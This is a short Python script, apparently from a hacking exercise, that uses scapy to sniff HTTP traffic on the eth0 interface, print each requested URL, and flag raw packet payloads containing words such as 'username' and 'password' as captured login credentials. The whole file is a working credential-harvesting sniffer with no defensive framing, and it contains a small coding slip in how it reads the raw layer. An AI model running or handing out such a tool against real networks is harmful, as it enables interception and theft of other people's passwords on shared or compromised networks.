#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


# @ Requires a name of an interface
# @ ensures information spoofing about the interface
# @ raises nothing
def sniff(interface):
    # prn callback function in each packet passage
    # filter choose tcp / udp / arp packets / port 21 (ftp)/port 80(web)
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# @ Requires a packet
# @ ensures the recomposed url
# @ raises nothing
# url (packet.show shows that urls are in the layer HTTP)
# they are made by the combine of the fields Host and Path
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# @ Requires a packet
# @ ensures a plain text that contains login information
# @ raises nothing
def get_login_info(packet):
    # packet.show shows that passwords and ids are in the layer raw
    if packet.haslayer(scapy.Raw):
        load = packet[packet.Raw].load

        # search contents that contain the world username or user or password or pass
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                # return break the for
                return load


# @ Requires a packet
# @ ensures renvoie l'url et les informations sur le login 
# @ raises nothing
def process_sniffed_packet(packet):
    # if packet has a layer and the layer is an HTTP request
    if packet.haslayer(http.HTTPRequest):

        # get and print url
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        # get and print login info
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")


sniff("eth0")
